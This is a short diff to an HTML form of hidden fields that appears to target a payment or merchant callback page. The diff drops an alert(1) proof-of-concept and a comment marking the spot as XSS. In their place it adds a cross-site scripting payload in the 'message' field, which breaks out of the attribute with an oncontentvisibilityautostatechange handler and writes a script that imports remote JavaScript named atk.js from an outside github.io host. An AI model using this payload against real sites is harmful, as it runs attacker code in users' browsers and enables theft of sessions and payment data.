@@ -48,8 +48,7 @@
       <input type="hidden" name="decision_return_code" value="1" />
       <input type="hidden" name="req_merchant_descriptor" value="1" />
 
-      <!-- XSS here -->
-      <input type="hidden" name="message" value="test%27+oncontentvisibilityautostatechange%3Ddocument.write(\'\u003csvg/onload=alert(1);\u003e\')+style%3D%27content-visibility%3Aauto" />
+      <input type="hidden" name="message" value="test'oncontentvisibilityautostatechange=document.write('\u003cscript\u003eimport(\'https://0xbastion.github.io/static-stuff/atk.js\').then(function(mod){console.log(\'Loaded:\',mod)});\u003c/script\u003e') style='content-visibility:auto" />
 
       <input type="hidden" name="signed_field_names" value="1" />
       <input type="hidden" name="req_transaction_uuid" value="1" />
